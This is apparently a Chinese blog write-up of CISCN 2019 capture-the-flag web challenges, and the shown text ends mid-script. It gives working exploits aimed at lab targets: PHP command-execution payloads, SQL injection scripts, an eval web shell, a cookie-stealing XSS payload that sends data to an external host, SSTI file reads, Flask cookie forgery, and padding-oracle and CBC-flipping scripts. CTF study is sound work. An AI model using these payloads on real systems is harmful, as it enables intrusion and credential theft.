<pre><code>/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat%20/flag</code></pre><p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>除此之外还可以构造</p>
<pre><code>exec(getallheaders(){1})</code></pre><p>在headers里加上</p>
<pre><code>1:cat /flag</code></pre><p>这一项执行</p>
<pre><code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})</code></pre><p>由于结果是echo返回的，上面使用逗号可以将两个结果都打印出来。<br>其他思路包括直接构造RCE语句，但是感觉没有上面的方法用起来舒服。看到网上还有其他非常有意思的解法，就不一一列举了。</p>
<h1 id="CyberPunk-二次注入"><a href="#CyberPunk-二次注入" class="headerlink" title="CyberPunk(二次注入)"></a>CyberPunk(二次注入)</h1><p>上来index.php中给了姓名，电话，地址三个框来填。同时还有三个功能：查询，修改，删除。由于查询这一个操作都只要姓名电话，我猜测剩下的地址这个参数可能是通过输入姓名电话对地址进行某种触发式注入。基本可以猜测是sql注入题型。</p>
<p>从源码处得到一个file参数。果断文件包含读到源码：<br>index.php</p>
<pre><code class="php">&lt;?php

ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);

$file = $_GET[&quot;file&quot;];
$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
if (isset($file)){
    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {
        echo(&#39;no way!&#39;);
        exit;
    }
    @include($file);
}
?&gt;</code></pre>
<p>search.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;; 

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        if(!$row) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;</code></pre>
<p>change.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $address = addslashes($_POST[&quot;address&quot;]);
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];
        $result = $db-&gt;query($sql);
        if(!$result) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;订单修改成功&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;</code></pre>
<p>delete.php</p>
<pre><code class="php">&lt;?php

require_once &quot;config.php&quot;;

if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
{
    $msg = &#39;&#39;;
    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;
    $user_name = $_POST[&quot;user_name&quot;];
    $phone = $_POST[&quot;phone&quot;];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = &#39;no sql inject!&#39;;
    }else{
        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;
        $fetch = $db-&gt;query($sql);
    }

    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);
        if(!$result) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;
        }
        $msg = &quot;订单删除成功&quot;;
    } else {
        $msg = &quot;未找到订单!&quot;;
    }
}else {
    $msg = &quot;信息不全&quot;;
}
?&gt;</code></pre>
<p>审计源码后重点关注address有无注入，发现题目都只对前两个参数进行了过滤，并未检查<code>address</code>。同时<code>address</code>只经过了一次<code>addslashes()</code>就被存储，这是经典的二次注入的使用场景。加上触发方式：</p>
<pre><code class="php">if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){
        $row = $fetch-&gt;fetch_assoc();
        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];
        $result = $db-&gt;query($sql);
        if(!$result) {
            echo &#39;error&#39;;
            print_r($db-&gt;error);
            exit;</code></pre>
<p>回显以<code>error</code>的形式被打印出来，证明我们需要使用报错注入。<br>具体形式是，我们提交姓名，电话，地址三个参数，并在地址使用报错注入。之后在change.php再次提交相同姓名电话与随便写地址，即可触发<code>update</code>执行报错注入。根据update语句构造payload:</p>
<pre><code>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#</code></pre><p>貌似题目flag不在库里，看wp发现是/flag.txt。有点迷惑。需要注意报错注入字段数的限制，调整<code>substr()</code>的后两个参数。</p>
<h1 id="Easyweb（布尔盲注）"><a href="#Easyweb（布尔盲注）" class="headerlink" title="Easyweb（布尔盲注）"></a>Easyweb（布尔盲注）</h1><p>开始从robots.txt得到的image.php.bak的源码泄露信息</p>
<pre><code class="php">&lt;﻿?php
include &quot;config.php&quot;;

$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;
$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);
$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);

$result=mysqli_query($con,&quot;select * from images where id=&#39;{$id}&#39; or path=&#39;{$path}&#39;&quot;);
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path=&quot;./&quot; . $row[&quot;path&quot;];
header(&quot;Content-Type: image/jpeg&quot;);
readfile($path);</code></pre>
<p>发现有sql注入点，主要要应对两个参数的过滤</p>
<pre><code>$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);
$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);</code></pre><p>考虑使用<code>\0</code>，并在path中注入。这样我们的sql语句就变成了:</p>
<pre><code>select * from images where id=&#39; or path=&#39; or 1=1#</code></pre><p>剩下的布尔盲注即可</p>
<pre><code class="python">import requests

flag=&#39;&#39;


for i in range(1,50):
    a=0
    print(i)#ciscnfinal, images,users
    for j in range(32, 128):#select group_concat(column_name) from information_schema.columns where table_name=database()
        #url = &quot;http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,1,0)%23&quot;
        url = &quot;http://b086efbf-5393-4974-b79d-0608047a11b0.node3.buuoj.cn/image.php?id=\\0&amp;path=or%20id=if(ascii(substr((select group_concat(password) from users),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&quot;,1,0)%23&quot;
        res = requests.get(url)
        if &#39;JFIF&#39; in res.text:
            flag += chr(j)
            print(flag)
            a = 1
            break
    if a==0:
        break</code></pre>
<p>注入得到username与password登录进入后台。发现一个文件上传点。简单fuzz下发现文件名会被存储到固定php日志文件中<code>logs/upload.b888aaa68e9659c297c4b02084157cff.log.php</code><br>既然如此只需上传一句话。发现php关键字被拦。<br>使用短标签绕过：</p>
<pre><code class="php">&lt;?=@eval($_GET[&#39;byc&#39;]);?&gt;</code></pre>
<p>这是因为</p>
<pre><code>//php.ini中
short_open_tag = On

//除&lt;?php ?&gt;，可使用更灵活的调用方法
&lt;? /*程序操作*/ ?&gt;
&lt;?=/*函数*/?&gt;</code></pre><p>bypass掉后执行命令<code>system(&#39;cat /flag&#39;);</code>即可</p>
<h1 id="华东南赛区-Web11（模板注入）"><a href="#华东南赛区-Web11（模板注入）" class="headerlink" title="华东南赛区 Web11（模板注入）"></a>华东南赛区 Web11（模板注入）</h1><p>这题开始看的我贼奇怪，因为整个网站貌似只是一个api接口。其中回显有一部分十分显眼<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="xff"><br>开始考虑是否存在关于xff头的信息。但是没测出来。去网上搜了波wp恍然大悟。原来关键点在网页下方提示的<code>Build With Smarty !</code><br>Smarty是一种php网页引擎，也存在如pythonjinja2的ssti注入。</p>
<p>同时其使用方法如<code>{if cmd}{/if}</code>可以执行命令。<br>所以首先bp里更改xff包，尝试2,发现注入成功；<br>之后直接任意命令执行即可拿到flag</p>
<pre><code>{file_get_contents(&#39;/flag&#39;)}</code></pre><p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag4.PNG" class="lazyload" data-srcset="flag4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
<h1 id="华东北赛区-Web2（存储型xss-sql注入）"><a href="#华东北赛区-Web2（存储型xss-sql注入）" class="headerlink" title="华东北赛区 Web2（存储型xss+sql注入）"></a>华东北赛区 Web2（存储型xss+sql注入）</h1><p>题目算是比较传统的xss触发模式了。注册登录后一个输入框允许我们使用xsspayload，还有一个界面输入验证码后触发bot阅读。我们目标就是打到admin的cookie。</p>
<p>首先尝试性弹个窗，结果在页面里看到个自己有心理阴影的CSP限制。</p>
<pre><code class="javascript">&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;&quot;&gt;</code></pre>
<p>好在csp规则不算比较严格。因为<code>&#39;unsafe-inline&#39; &#39;unsafe-eval&#39;</code>允许我们加载一段内联js代码执行。而解决这个的办法只需使用<code>window.location.href</code>就可绕过。这里因为有buuoj提供的xss平台，所以直接用生成的代码打一打看看。发现有过滤与转换，估计得实体编码绕过。<br>把xss平台生成的payload改成实体编码：(注意id值是生成代码里的id，一开始以为是项目名id半天打不到)</p>
<pre><code class="javascript">(function(){window.location.href=&#39;http://ip:port/index.php?do=api&amp;id=ex0I6K&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return &#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return &#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return &#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return &#39;&#39;}})());})();</code></pre>
<pre><code class="javascript">&lt;svg&gt;&lt;script&gt;实体编码payload&lt;/script&gt;</code></pre>
<p>提交后访问页面，可以看到平台是能收到cookie的，那就不需要关心其他的，直接去反馈页面跑段脚本爆破验证码提交即可。等待bot点击页面，之后平台收到cookie<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="cookie"><br>修改登录进入admin.php后台，一个明显的sql注入直接联合查询即可。3个字段，回显第2,3个<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag5.PNG" class="lazyload" data-srcset="flag5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p>
<h1 id="double-secrect-ssti"><a href="#double-secrect-ssti" class="headerlink" title="double secrect (ssti)"></a>double secrect (ssti)</h1><p>基本上唬人的成分比较大。因为一开始进入题目只有一句<code>Welcome To Find Secret</code>，之后访问robots.txt发现居然报this is android ctf，让我以为看错题了。但其实访问secret路由并传参secret时，发现会有回显。当回显字数多的时候出现python报错，可以猜测是ssti。这里我尝试直接传一段中文，其实ascii码比较大的文字也会触发报错，爆出重要源码：<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/6.PNG" class="lazyload" data-srcset="6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="RC4"></p>
<p>原来是段加密，而且爆出的源码连key值都给了。那么直接RC4加密我们的ssti payload基本就完事了。<br>exp:</p>
<pre><code class="python">import requests
import urllib

class RC4:
    def __init__(self, key):
        self.key = key
        self.key_length = len(key)
        self._init_S_box()

    def _init_S_box(self):
        self.Box = [i for i in range(256)]
        k = [self.key[i % self.key_length] for i in range(256)]
        j = 0
        for i in range(256):
            j = (j + self.Box[i] + ord(k[i])) % 256
            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]

    def crypt(self, plaintext):
        i = 0
        j = 0
        result = &#39;&#39;
        for ch in plaintext:
            i = (i + 1) % 256
            j = (j + self.Box[i]) % 256
            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]
            t = (self.Box[i] + self.Box[j]) % 256
            result += chr(self.Box[t] ^ ord(ch))
        return result

url=&#39;http://7318e5d2-ecf4-4961-b115-4f1eb3b11c4a.node3.buuoj.cn/secret?secret=&#39;
a = RC4(&#39;HereIsTreasure&#39;)
cmd=&quot;{{''.__class__.__mro__[2].__subclasses__()[40]('/flag.txt').read()}}&quot;
payload = urllib.parse.quote(a.crypt(cmd))
res = requests.get(url + payload)
print(res.text)</code></pre>
<h1 id="华东南赛区-Web4-flask-session-cookie伪造"><a href="#华东南赛区-Web4-flask-session-cookie伪造" class="headerlink" title="华东南赛区 Web4 (flask session cookie伪造)"></a>华东南赛区 Web4 (flask session cookie伪造)</h1><p>被没必要的情况给浪费了时间……主要是环境问题，心里苦啊。<br>首先题目给了一个参数可以读取文件，由于路由名称，先看下源码app.py</p>
<pre><code class="python"># encoding:utf-8 
import re, random, uuid, 
urllib from flask 
import Flask, session, request 
app = Flask(__name__) 
random.seed(uuid.getnode()) 
app.config[&#39;SECRET_KEY&#39;] = str(random.random()*233) 
app.debug = True @app.route(&#39;/&#39;) 
def index(): 
    session[&#39;username&#39;] = &#39;www-data&#39; 
    return &#39;Hello World! Read somethings&#39; 


@app.route(&#39;/read&#39;) 
def read(): 
    try: url = request.args.get(&#39;url&#39;) 
         m = re.findall(&#39;^file.*&#39;, url, re.IGNORECASE) 
         n = re.findall(&#39;flag&#39;, url, re.IGNORECASE) 
         if m or n: return &#39;No Hack&#39; 
            res = urllib.urlopen(url) 
            return res.read() 
    except Exception as ex: 
        print str(ex) 
        return &#39;no response&#39; 


@app.route(&#39;/flag&#39;) 
def flag(): 
    if session and session[&#39;username&#39;] == &#39;fuck&#39;: 
        return open(&#39;/flag.txt&#39;).read() 
    else: 
        return &#39;Access denied&#39; 

if __name__==&#39;__main__&#39;: 
    app.run( debug=True, host=&quot;0.0.0.0&quot; )</code></pre>
<p>可以看到只要伪造<code>session[&#39;username&#39;]</code>的值就可以拿到flag了。由于这里的随机数种子<code>SECRECT_KEY</code>很轻松就可以伪造，所以直接上脚本爆破并生成cookie值</p>
<pre><code class="python">import flask_session_cookie_manager2
import random
mac = &quot;02:42:ae:00:d0:09&quot;
random.seed(int(mac.replace(&quot;:&quot;, &quot;&quot;), 16))
for x in range(1000):
    key = str(random.random() * 233)
    result = flask_session_cookie_manager2.FSCM.decode(&#39;eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XljQxQ.zBqq36UiMEIrykW9oqSlvg4wBkw&#39;, key)
    if &#39;error&#39; not in result:
        result[u&#39;username&#39;] = &#39;fuck&#39;
        print flask_session_cookie_manager2.FSCM.encode(key, str(result))
        exit()</code></pre>
<p>理论上改cookie就完事了，但是我白花了一个多小时，因为虚拟机的py2的环境有问题。期间还发现，原来参数不变时生成的cookie也会因为时间原因而不同。<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/7.PNG" class="lazyload" data-srcset="7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="不同的时间戳导致值不同"><br>当然这并不影响结果。只要是python2理论上就没有问题。<br>最后还是在vps上跑的脚本才拿到flag……</p>
<h1 id="PointSystem-PaddingOracle-cbc翻转"><a href="#PointSystem-PaddingOracle-cbc翻转" class="headerlink" title="PointSystem(PaddingOracle+cbc翻转)"></a>PointSystem(PaddingOracle+cbc翻转)</h1><p>题目难度挺大的，前后还拖了不少时间，最后参考了出题人赵师傅的wp才勉强写出来的。其中涉及PaddingOracle+CBC翻转攻击的知识涉及密码学，自己所知甚少，原来也只套过脚本做过一道paddingoracle的题目。所以先把解题过程放一下，抽空把padding oracle等等加密原理理解下。</p>
<p>首先题目从robots.txt中获取信息，进入<code>swagger-ui.html</code>，可以看到有许多api接口的使用。<img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/8.PNG" class="lazyload" data-srcset="8.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="api"><br>一开始尝试能否直接在这个界面进行命令执行，比如注册或者ping之类的。但是发现并不可行。不过我们既然知道有注册接口，直接按照格式利用接口注册一个账号就好了。<br>注册后尝试登录，却意外发现存在权限不够的问题。</p>
<p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/9.PNG" class="lazyload" data-srcset="9.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="权限"><br>但是在burpsuite中意外发现了除了一个登录的post包，还有一个get请求了未知的api并返回信息。<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/10.PNG" class="lazyload" data-srcset="10.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="info"><br>将登录所返回的一段base64进行解码得到：</p>
<pre><code class="json">{&quot;signed_key&quot;:&quot;SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1ZOzOMzVHlzkkVTuw8vkgQOwMZ2B5Leaq0Gc+rzoKtQdjsiMrpsSBq/QvWKTHYKxBHN0JzlQd6bXhFdSUa4slA7g==&quot;,&quot;role&quot;:3,&quot;user_id&quot;:1,&quot;payload&quot;:&quot;CHAkpjTggDemZY7gzXBvbR2WeXJ47cfj&quot;,&quot;expire_in&quot;:1582905111}</code></pre>
<p>而前面的<code>signed_key</code>也进行base64解码的话，会发现内容由明文+密文组合起来了。说明有可能服务器采取cbc模式加密。我们要做的就是paddingoracle破解出结构并cbc翻转一下。<br>padding oracleexp:</p>
<pre><code class="python">import time
import requests
import base64
import json

host = &quot;d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn&quot;



def padding_oracle(key):
    user_key_decode = base64.b64decode(key)
    user_key_json_decode = json.loads(user_key_decode)
    signed_key = user_key_json_decode[&#39;signed_key&#39;]
    signed_key_decoded = base64.b64decode(signed_key)
    url = &quot;http://&quot; + host + &quot;/frontend/api/v1/user/info&quot;

    N = 16

    total_plain = &#39;&#39;
    for block in range(0, len(signed_key_decoded) // 16 - 1):
        print(block)
        token = &#39;&#39;
        get = b&quot;&quot;
        cipher = signed_key_decoded[16 + block * 16:32 + block * 16]
        for i in range(1, N+1):
            for j in range(0, 256):
                time.sleep(0.2)
                padding = b&quot;&quot;.join([(get[n] ^ i).to_bytes(1, &#39;little&#39;) for n in range(len(get))])
                c = b&#39;\x00&#39; * (16 - i) + j.to_bytes(1, &#39;little&#39;) + padding + cipher
                #print(c)
                token = base64.b64encode(c)
                user_key_json_decode[&#39;signed_key&#39;] = token.decode(&quot;utf-8&quot;)
                header = {&#39;Key&#39;: base64.b64encode(bytes(json.dumps(user_key_json_decode), &quot;utf-8&quot;))}
                res = requests.get(url, headers=header)
                if &#39;少女&#39; in res.text:
                    print(&#39;404 error occured!&#39;)
                    time.sleep(15.0)
                    res = requests.get(url, headers=header)
                if res.json()[&#39;code&#39;] == 206:
                    get = (j ^ i).to_bytes(1, &#39;little&#39;) + get
                    print(i,get)
                    break

        plain = b&quot;&quot;.join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, &#39;little&#39;) for i in range(N)])
        print(plain.decode(&quot;utf-8&quot;), &quot;block=%d&quot; % block)
        total_plain += plain.decode(&quot;utf-8&quot;)
        print(total_plain)

    return total_plain

plain_text = padding_oracle(&quot;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY2lZV3YrYW9NZi9EV2hvU1laaVFpWTJkanlpV1hJbGNqM2FRTndmajdLNnpvZGwzcUhsb2lPakdxWGhCRTN6UHVTeDMwY2lPdlpMZm5ya2tDZ0ZWRXFRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoic3c4SHByRENncFJHRWZwYzMxY29KME1DR1NkRm90SlgiLCJleHBpcmVfaW4iOjE1ODI5ODYwODB9&quot;)
print(plain_text)</code></pre>
<p>由于padding需要频繁请求服务器，buu的靶机期间经常出现404。所以我得在每次出现404时sleep十多秒……太难了，跑了快几小时才好。跑完后得到明文结构</p>
<pre><code class="json">{&quot;role&quot;:3,&quot;user_id&quot;:2,&quot;payload&quot;:&quot;sw8HprDCgpRGEfpc31coJ0MCGSdFotJX&quot;,&quot;expire_in&quot;:1582986080}</code></pre>
<p>既然如此，把role改为1应该就可以解决权限问题。所以cbc翻转下</p>
<pre><code class="python">
import requests
import base64
import json

host = &quot;d46d6658-3bdd-48d9-8600-ee320a2a837a.node3.buuoj.cn&quot;

def cbc_attack(key, block, origin_content, target_content):
    user_key_decode = base64.b64decode(key)
    #print(user_key_decode)
    user_key_json_decode = json.loads(user_key_decode)
    signed_key = user_key_json_decode[&#39;signed_key&#39;]
    #print(signed_key)
    cipher_o = base64.b64decode(signed_key)
    #print(cipher_o)
    if block &gt; 0:
        iv_prefix = cipher_o[:block * 16]
    else:
        iv_prefix = b&#39;&#39;
    iv = cipher_o[block * 16:16 + block * 16]
    cipher = cipher_o[16 + block * 16:]
    iv_array = bytearray(iv)
    for i in range(0, 16):
        iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i])
    iv = bytes(iv_array)
    #print(iv)
    user_key_json_decode[&#39;signed_key&#39;] = base64.b64encode(iv_prefix + iv + cipher).decode(&#39;utf-8&#39;)
    return base64.b64encode(bytes(json.dumps(user_key_json_decode), &quot;utf-8&quot;))


def get_user_info(key):
    r = requests.post(&quot;http://&quot; + host +&quot;/frontend/api/v1/user/info&quot;, headers={&quot;Key&quot;: key})
    if r.json()[&#39;code&#39;] == 100:
        print(&quot;获取成功！&quot;)
    #return r.json()[&#39;data&#39;]


def modify_role_plain(key, role):
    user_key_decode = base64.b64decode(user_key)
    user_key_json_decode = json.loads(user_key_decode)
    user_key_json_decode[&#39;role&#39;] = role
    return base64.b64encode(bytes(json.dumps(user_key_json_decode), &#39;utf-8&#39;)).decode(&#39;utf-8&#39;)

print(&quot;翻转 Key:&quot;)
user_key = cbc_attack(&quot;eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaEVqZjRGRjhTQVV5VjVmS3RqbGhuY0JWN1BLdlJ2UVlGdVUydlppRXRKYlV0NkJWZGRlZUp0Rll2Nnl4dmxpaVhYMTdEcVZ6WXJjVjJEeTloekpaM29Gcm9yV0hUWDh0T2N0bjFITXFSSlBnPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoyLCJwYXlsb2FkIjoidjByeEZqT2NJZW0xYzNta3o5Q2VINXZYdWxuZ0pES3AiLCJleHBpcmVfaW4iOjE1ODI5OTU2NDh9&quot;, 0, &#39;{&quot;role&quot;:3,&quot;user_&#39;, &#39;{&quot;role&quot;:1,&quot;user_&#39;)
user_key = modify_role_plain(user_key, 1)
print(user_key)
print(&quot;测试拉取用户信息：&quot;)
